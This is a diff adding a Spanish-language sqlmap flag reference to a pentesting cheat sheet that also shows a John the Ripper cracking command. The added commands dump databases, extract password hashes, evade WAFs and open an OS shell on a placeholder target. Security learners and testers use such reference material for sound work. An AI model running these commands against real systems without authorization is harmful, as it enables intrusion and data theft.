@@ -341,8 +341,121 @@ Si devuelve información inesperada, es probable que sea vulnerable. 🔥
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
    ```
+#### 🛠️ Banderas útiles de SQLmap
 
----
+##### 1. **`-u` o `--url`** 🌐
+   - **Uso**: Especifica la URL del objetivo que deseas escanear.
+   - **Ejemplo**: 
+     ```
+     sqlmap -u http://example.com/page?id=1
+     ```
+
+##### 2. **`--dbs`** 💾
+   - **Uso**: Enumera todas las bases de datos disponibles en el servidor.
+   - **Ejemplo**: 
+     ```
+     sqlmap -u http://example.com/page?id=1 --dbs
+     ```
+
+##### 3. **`--tables`** 📋
+   - **Uso**: Muestra las tablas de una base de datos específica.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --dbs --tables -D target_db
+     ```
+
+##### 4. **`--columns`** 🗃️
+   - **Uso**: Enumera las columnas de una tabla específica dentro de una base de datos.
+   - **Ejemplo**: 
+     ```
+     sqlmap -u http://example.com/page?id=1 --columns -D target_db -T target_table
+     ```
+
+##### 5. **`--dump`** 💾
+   - **Uso**: Extrae y voltea los datos de las tablas (es decir, volcar los datos).
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --dump -D target_db -T target_table
+     ```
+
+##### 6. **`--batch`** 🕒
+   - **Uso**: Ejecuta sqlmap automáticamente sin pedir confirmación al usuario, útil para ejecuciones automatizadas.
+   - **Ejemplo**: 
+     ```
+     sqlmap -u http://example.com/page?id=1 --batch
+     ```
+
+##### 7. **`--risk` y `--level`** ⚠️
+   - **Uso**: Ajusta el nivel de riesgo y la profundidad de las pruebas de inyección.
+   - **`--level`**: El nivel de pruebas, de 1 a 5. A mayor nivel, más pruebas se realizan.
+   - **`--risk`**: Controla el riesgo de las pruebas. Puede ser de 1 a 3.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --level=5 --risk=3
+     ```
+
+##### 8. **`--tamper`** 🛡️
+   - **Uso**: Aplica scripts de manipulación para evadir filtros de seguridad (WAF, IDS, etc.).
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --tamper=greatest,least
+     ```
+
+##### 9. **`--threads`** 🔄
+   - **Uso**: Establece el número de hilos (threads) para ejecutar múltiples pruebas simultáneamente y acelerar el proceso.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --threads=10
+     ```
+
+##### 10. **`--cookie`** 🍪
+   - **Uso**: Define las cookies que deben usarse para la sesión de la prueba.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --cookie="PHPSESSID=1234567890abcdef"
+     ```
+
+##### 11. **`--user-agent`** 🖥️
+   - **Uso**: Permite cambiar el User-Agent que sqlmap usa en las solicitudes HTTP.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --user-agent="Mozilla/5.0"
+     ```
+
+##### 12. **`--crawl`** 🧭
+   - **Uso**: Especifica cuántos niveles de enlace debe rastrear sqlmap para identificar URLs vulnerables.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com --crawl=3
+     ```
+
+##### 13. **`--technique`** 🔍
+   - **Uso**: Permite especificar las técnicas de inyección SQL que se deben probar. Puedes elegir entre `B` (boolean-based), `T` (time-based), `U` (UNION query), `S` (stacked queries), etc.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --technique=U
+     ```
+
+##### 14. **`--os-shell`** 💻
+   - **Uso**: Intenta obtener acceso a un **shell del sistema operativo** de la máquina vulnerable (esto solo es posible si la inyección SQL permite ejecutar comandos del sistema operativo).
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --os-shell
+     ```
+
+##### 15. **`--passwords`** 🔑
+   - **Uso**: Si el sistema tiene autenticación, puedes extraer las contraseñas de los usuarios de la base de datos.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --passwords
+     ```
+
+##### 16. **`--dump-all`** 📥
+   - **Uso**: Extrae todos los datos de todas las bases de datos, tablas y columnas.
+   - **Ejemplo**:
+     ```
+     sqlmap -u http://example.com/page?id=1 --dump-all
+     ```
 
 ## 🔎 XSS (Cross-Site Scripting)
 
